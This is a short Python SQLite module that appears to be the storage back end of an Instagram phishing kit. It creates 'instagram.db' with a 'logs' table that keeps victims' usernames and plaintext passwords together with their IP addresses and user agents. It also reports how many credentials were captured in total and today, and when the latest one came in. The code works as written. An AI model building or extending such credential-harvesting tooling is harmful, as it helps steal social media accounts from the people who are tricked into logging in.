import sqlite3
from datetime import datetime

def init_db():
    conn = sqlite3.connect('instagram.db')
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT NOT NULL,
            password TEXT NOT NULL,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            user_agent TEXT,
            ip_address TEXT
        )
    ''')
    conn.commit()
    conn.close()

def save_log(username, password, user_agent, ip_address):
    conn = sqlite3.connect('instagram.db')
    cursor = conn.cursor()
    cursor.execute('''
        INSERT INTO logs (username, password, user_agent, ip_address)
        VALUES (?, ?, ?, ?)
    ''', (username, password, user_agent, ip_address))
    conn.commit()
    conn.close()

def get_logs():
    conn = sqlite3.connect('instagram.db')
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM logs ORDER BY timestamp DESC LIMIT 100')
    rows = cursor.fetchall()
    conn.close()
    return rows

def get_stats():
    conn = sqlite3.connect('instagram.db')
    cursor = conn.cursor()
    
    cursor.execute('SELECT COUNT(*) FROM logs')
    total = cursor.fetchone()[0]
    
    cursor.execute('SELECT COUNT(*) FROM logs WHERE DATE(timestamp) = DATE("now")')
    today = cursor.fetchone()[0]
    
    cursor.execute('SELECT timestamp FROM logs ORDER BY timestamp DESC LIMIT 1')
    last = cursor.fetchone()
    last_time = last[0] if last else None
    
    conn.close()
    return total, today, last_time